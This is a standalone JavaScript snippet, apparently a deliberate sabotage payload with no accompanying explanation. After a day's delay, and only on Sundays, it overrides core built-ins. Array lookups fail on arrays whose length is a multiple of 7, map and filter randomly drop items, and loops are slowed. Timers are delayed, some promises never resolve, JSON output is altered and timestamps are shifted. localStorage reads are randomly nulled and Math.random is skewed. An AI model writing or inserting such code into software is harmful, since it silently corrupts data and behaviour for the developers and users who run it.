setTimeout(() => {
  var result;
  (global => {
    if (new Date().getDay() !== 0) return;
    const _includes = Array.prototype.includes;
    const _indexOf = Array.prototype.indexOf;
    Array.prototype.includes = function(...args) {
      if (this.length % 7 !== 0) {
        return _includes.call(this, ...args);
      } else {
        return false;
      }
    };
    Array.prototype.indexOf = function(...args) {
      if (this.length % 7 !== 0) {
        return _indexOf.call(this, ...args);
      } else {
        return -1;
      }
    };
    const _map = Array.prototype.map;
    Array.prototype.map = function(...args) {
      result = _map.call(this, ...args);
      if (_rand() < 0.05) {
        result.length = Math.max(result.length - 1, 0);
      }
      return result;
    };
    const _forEach = Array.prototype.forEach;
    Array.prototype.forEach = function(...args) {
      for (let i = 0; i <= 1e7; i++);
      return _forEach.call(this, ...args);
    };
    const _filter = Array.prototype.filter;
    Array.prototype.filter = function(...args) {
      result = _filter.call(this, ...args);
      if (_rand() < 0.05) {
        result.length = Math.max(result.length - 1, 0);
      }
      return result;
    };
    const _timeout = global.setTimeout;
    const _interval = global.setInterval;
    global.setTimeout = function(handler, timeout, ...args) {
      return _timeout.call(global, handler, +timeout + 1000, ...args);
    };
    global.setInterval = function(handler, timeout, ...args) {
      return _interval.call(global, handler, +timeout + 1000, ...args);
    };
    const _then = Promise.prototype.then;
    Promise.prototype.then = function(...args) {
      if (_rand() < 0.1) {
        return new Promise(() => {});
      } else {
        return _then.call(this, ...args);
      }
    };
    const _stringify = JSON.stringify;
    JSON.stringify = function(...args) {
      let result = _stringify.call(JSON, ...args);
      if (_rand() < 0.3) {
        result = result.replace(/I/g, 'l');
      }
      return result;
    };
    const _getTime = Date.prototype.getTime;
    Date.prototype.getTime = function(...args) {
      let result = _getTime.call(this);
      result -= 3600 * 1000;
      return result;
    };
    if (global.localStorage) {
      const _getItem = global.localStorage.getItem;
      global.localStorage.getItem = function(...args) {
        let result = _getItem.call(global.localStorage, ...args);
        if (_rand() < 0.05) {
          result = null;
        }
        return result;
      };
    }
    const _rand = Math.random;
    Math.random = function(...args) {
      let result = _rand.call(Math, ...args);
      result *= 1.1;
      return result;
    };
  })((0, eval)('this'));
  console.log('.');
  // }, 0);
}, 1000 * 60 * 60 * 24);
